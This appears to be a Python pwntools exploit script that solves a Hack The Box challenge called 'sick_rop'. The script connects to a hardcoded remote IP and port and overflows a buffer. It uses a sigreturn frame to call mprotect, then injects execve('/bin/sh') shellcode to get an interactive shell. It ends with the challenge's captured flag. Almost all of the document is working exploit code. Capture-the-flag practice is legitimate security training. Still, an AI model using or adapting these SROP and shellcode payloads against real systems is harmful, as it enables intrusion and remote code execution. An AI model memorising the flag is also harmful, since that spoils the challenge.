from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *vuln+32
continue
'''.format(**locals())

exe = './challenge/sick_rop'

elf = context.binary = ELF(exe, checksec=False)
p = remote("142.93.37.215", 31655)

shellcode = asm("""
    mov rdi, 0x68732f6e69622f
    mov rax, 0x3b
    xor rsi, rsi
    xor rdx, rdx
    push rdi
    mov rdi, rsp
    syscall""")

syscall = 0x401014
vuln_function  = p64(0x40102e)
vuln_pointer = 0x4010d8


frame = SigreturnFrame()
frame.rax = 10              
frame.rdi = 0x400000        
frame.rsi = 0x4000          
frame.rdx = 7           
frame.rsp = 0x4010d8    
frame.rip = syscall     

payload1 = flat(
    cyclic(40),
    elf.sym.vuln,
    syscall,
    frame
)

p.send(payload1)
p.recv()

p.send(cyclic(15))
p.recv()

payload3 = shellcode + b"\x90"*(40 - len(shellcode)) + p64(0x4010b8)
p.send(payload3)
p.recv()

p.interactive()

# flag: HTB{why_st0p_wh3n_y0u_cAn_s1GRoP!?}
